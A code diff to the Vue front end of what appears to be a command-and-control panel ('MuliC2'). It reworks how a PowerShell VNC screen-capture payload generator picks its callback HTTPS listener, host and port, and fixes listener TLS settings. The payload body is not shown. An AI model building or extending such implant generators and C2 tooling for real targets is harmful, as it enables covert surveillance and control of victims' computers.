@@ -269,18 +269,23 @@
             <el-form :model="vncForm" label-width="150px" class="vnc-form">
               <el-row :gutter="20">
                 <el-col :span="12">
-                  <el-form-item label="LHOST (Your IP):">
-                    <el-input v-model="vncForm.lhost" placeholder="192.168.1.100" />
-                    <span class="form-help">Your server's IP address</span>
+                  <el-form-item label="Target Listener:">
+                    <el-select v-model="selectedListenerId" placeholder="Select active HTTPS listener" style="width: 100%" @change="updateVncFormFromListener">
+                      <el-option
+                        v-for="listener in activeHTTPSListeners"
+                        :key="listener.id"
+                        :label="`${listener.name} (${listener.host}:${listener.port})`"
+                        :value="listener.id"
+                      />
+                    </el-select>
+                    <span class="form-help">Choose which HTTPS listener the VNC payload connects to</span>
                   </el-form-item>
                 </el-col>
-              </el-row>
-              
-              <el-row :gutter="20">
                 <el-col :span="12">
-                  <el-form-item label="C2 Port:">
-                    <el-input :model-value="vncForm.c2Port" disabled placeholder="Auto from active TLS listener" />
-                    <span class="form-help">Auto-detected from active TLS listener</span>
+                  <el-form-item label="Connection Info:">
+                    <div class="connection-info">
+                      <p><strong>Target:</strong> {{ selectedListener ? `${selectedListener.host === '0.0.0.0' ? (getCurrentHostname()) : selectedListener.host}:${selectedListener.port}` : 'No listener selected' }}</p>
+                    </div>
                   </el-form-item>
                 </el-col>
               </el-row>
@@ -315,6 +320,10 @@
                   <el-icon><Connection /></el-icon>
                   Use Server Config
                 </el-button>
+                <el-button type="success" @click="refreshListeners">
+                  <el-icon><Refresh /></el-icon>
+                  Refresh Listeners
+                </el-button>
               </el-form-item>
             </el-form>
           </div>
@@ -323,8 +332,8 @@
           <div v-if="generatedVncPayload" class="vnc-output">
             <h3>Generated VNC Payload:</h3>
             <div class="vnc-info">
-              <p><strong>LHOST:</strong> {{ vncForm.lhost }}</p>
-              <p><strong>C2 Port:</strong> {{ vncForm.c2Port }}</p>
+              <p><strong>Target Listener:</strong> {{ selectedListener ? selectedListener.name : 'None' }}</p>
+              <p><strong>Connection:</strong> {{ selectedListener ? `${selectedListener.host === '0.0.0.0' ? getCurrentHostname() : selectedListener.host}:${selectedListener.port}` : 'None' }}</p>
               <p><strong>Type:</strong> {{ vncForm.payloadType }}</p>
               <p><strong>Loader:</strong> {{ vncForm.useLoader ? 'Enabled' : 'Disabled' }}</p>
               <p><strong>Generated:</strong> {{ new Date().toLocaleString() }}</p>
@@ -508,7 +517,7 @@
 </template>
 
 <script setup lang="ts">
-import { ref, computed, onMounted } from 'vue'
+import { ref, computed, onMounted, watch } from 'vue'
 import { ElMessage, ElMessageBox } from 'element-plus'
 
 // Types
@@ -591,11 +600,12 @@ const creatingListener = ref(false)
 
 // VNC Payload Generator
 const vncForm = ref({
-  lhost: '',
-  c2Port: '', // Auto-detected C2 server port (blank until detected)
+  lhost: '', // Auto-filled from selected listener
+  c2Port: '', // Auto-filled from selected listener
   payloadType: 'powershell',
   useLoader: true
 })
+const selectedListenerId = ref<string>('')
 const generatingVnc = ref(false)
 const generatedVncPayload = ref('')
 
@@ -857,8 +867,8 @@ const createListener = async () => {
         port: parseInt(listenerForm.value.port),
         description: listenerForm.value.description,
         useTLS: listenerForm.value.protocol === 'https',
-        certFile: listenerForm.value.protocol === 'tls' ? '../server.crt' : '',
-        keyFile: listenerForm.value.protocol === 'tls' ? '../server.key' : '',
+        certFile: listenerForm.value.protocol === 'https' ? '../server.crt' : '',
+        keyFile: listenerForm.value.protocol === 'https' ? '../server.key' : '',
         isActive: false
       })
     })
@@ -900,6 +910,9 @@ const startListener = async (listener: any) => {
       vncForm.value.c2Port = String(listener.port)
     }
     ElMessage.success(`Started listener: ${listener.name}`)
+    
+    // Refresh dashboard data to update the VNC dropdown
+    await loadDashboardData()
   } catch (error) {
     console.error('Failed to start listener:', error)
     const errorMessage = error instanceof Error ? error.message : 'Unknown error'
@@ -993,32 +1006,27 @@ const disconnectAgent = async (agent: any) => {
 
 // VNC Payload Generator Functions
 const generateVncPayload = async () => {
-  // Ensure C2 port is auto-detected
-  setPortFromActiveListener()
-  if (!activeTLSListener.value) {
-    setPortFromActiveProfile()
-  }
-
-  if (!activeTLSListener.value) {
-    ElMessage.error('No HTTPS listener active. Start an HTTPS listener to generate a VNC payload.')
+  if (!selectedListener.value) {
+    ElMessage.error('No HTTPS listener selected. Please select an active HTTPS listener first.')
     return
   }
 
-  if (!vncForm.value.lhost) {
-    ElMessage.error('Please provide LHOST')
+  if (!selectedListener.value.isActive) {
+    ElMessage.error('Selected listener is not active. Please start the listener first.')
     return
   }
   
   generatingVnc.value = true
   
   try {
-    // Use the LHOST as the C2 server and get the C2 port from the form
-    const c2Host = vncForm.value.lhost
-    const c2Port = vncForm.value.c2Port || (activeTLSProfile.value ? String(activeTLSProfile.value.port) : '443')
+    // Get connection details from the selected listener
+    const c2Host = selectedListener.value.host === '0.0.0.0' ? getCurrentHostname() : selectedListener.value.host
+    const c2Port = selectedListener.value.port
     
     console.log('VNC Configuration:', { c2Host, c2Port })
     
-    let payload = `# MuliC2 VNC Screen Capture Agent
+    let payload = `
+    # MuliC2 VNC Screen Capture Agent
 # C2 Host: ${c2Host}
 # C2 Port: ${c2Port}
 # Type: ${vncForm.value.payloadType}
@@ -1451,23 +1459,24 @@ const toggleFullscreen = () => {
 const clearVncForm = () => {
   vncForm.value = {
     lhost: '',
-    c2Port: '', // Auto-detected C2 server port
+    c2Port: '',
     payloadType: 'powershell',
     useLoader: true
   }
+  selectedListenerId.value = ''
   generatedVncPayload.value = ''
 }
 
 const autoFillVncFromConfig = () => {
-  // Get the first active TLS profile for C2 configuration
-  const activeProfile = availableProfiles.value.find(p => p.isActive && p.useTLS)
+  // Get the first active HTTPS listener
+  const activeListener = listeners.value.find(l => l.isActive && l.useTLS)
   
-  if (activeProfile) {
-    vncForm.value.lhost = window.location.hostname || 'localhost'
-    vncForm.value.c2Port = activeProfile.port.toString() // Set C2 port from profile
-    ElMessage.success(`Auto-filled using ${activeProfile.name} (Port: ${activeProfile.port})`)
+  if (activeListener) {
+    selectedListenerId.value = activeListener.id
+    updateVncFormFromListener()
+    ElMessage.success(`Auto-selected listener: ${activeListener.name} (${activeListener.host}:${activeListener.port})`)
   } else {
-    ElMessage.warning('No active TLS profiles found. Please check your C2 configuration.')
+    ElMessage.warning('No active HTTPS listeners found. Please start an HTTPS listener first.')
   }
 }
 
@@ -1485,7 +1494,10 @@ const downloadVncPayload = () => {
   const url = URL.createObjectURL(blob)
   const a = document.createElement('a')
   a.href = url
-  a.download = `vnc_payload_${vncForm.value.lhost}_${vncForm.value.c2Port}.ps1`
+  const filename = selectedListener.value 
+    ? `vnc_payload_${selectedListener.value.host}_${selectedListener.value.port}.ps1`
+    : 'vnc_payload.ps1'
+  a.download = filename
   document.body.appendChild(a)
   a.click()
   document.body.removeChild(a)
@@ -1525,6 +1537,13 @@ onMounted(() => {
   loadProfiles() // Load profiles on mount
 })
 
+// Watch for listener selection changes
+watch(selectedListenerId, (newId: string) => {
+  if (newId) {
+    updateVncFormFromListener()
+  }
+})
+
 // Update dashboard statistics
 const updateStats = () => {
   stats.value.totalImplants = implants.value.length
@@ -1547,6 +1566,11 @@ const loadDashboardData = async () => {
       listeners.value = data.listeners || []
       // Update C2 port from active TLS listener if available
       setPortFromActiveListener()
+      // Auto-select first active HTTPS listener if none selected
+      if (!selectedListenerId.value && activeHTTPSListeners.value.length > 0) {
+        selectedListenerId.value = activeHTTPSListeners.value[0].id
+        updateC2PortFromSelectedListener()
+      }
     }
     
     // TODO: Replace with actual API calls for other data
@@ -1582,6 +1606,46 @@ const activeTLSListener = computed<Listener | undefined>(() => {
 const setPortFromActiveListener = () => {
   if (activeTLSListener.value) {
     vncForm.value.c2Port = String(activeTLSListener.value.port)
+  }
+}
+
+const activeHTTPSListeners = computed<Listener[]>(() => {
+  return listeners.value.filter(l => l.isActive && l.useTLS)
+})
+
+const selectedListener = computed<Listener | undefined>(() => {
+  return listeners.value.find(l => l.id === selectedListenerId.value)
+})
+
+const updateVncFormFromListener = () => {
+  if (selectedListener.value) {
+    vncForm.value.c2Port = String(selectedListener.value.port)
+    const host = selectedListener.value.host || ''
+    const isBindAll = host === '0.0.0.0' || host === '::' || host === '::0' || host === '0:0:0:0'
+    vncForm.value.lhost = isBindAll ? (window.location.hostname || 'localhost') : host
+  }
+}
+
+const getCurrentHostname = () => {
+  return window.location.hostname || 'localhost'
+}
+
+const updateC2PortFromSelectedListener = () => {
+  if (selectedListener.value) {
+    vncForm.value.c2Port = String(selectedListener.value.port)
+    const host = selectedListener.value.host || ''
+    const isBindAll = host === '0.0.0.0' || host === '::' || host === '::0' || host === '0:0:0:0'
+    vncForm.value.lhost = isBindAll ? getCurrentHostname() : host
+  }
+}
+
+const refreshListeners = async () => {
+  try {
+    await loadDashboardData()
+    ElMessage.success('Listeners refreshed')
+  } catch (error) {
+    console.error('Failed to refresh listeners:', error)
+    ElMessage.error('Failed to refresh listeners')
   }
 }
 </script>
@@ -2113,6 +2177,19 @@ const setPortFromActiveListener = () => {
   color: var(--text-gray);
   font-size: 12px;
   margin-left: 8px;
+}
+
+.vnc-panel .connection-info {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid var(--border-color);
+  border-radius: 4px;
+  padding: 10px;
+  
+  p {
+    margin: 0;
+    color: var(--text-white);
+    font-family: 'Courier New', monospace;
+  }
 }
 
 .vnc-panel .vnc-output {
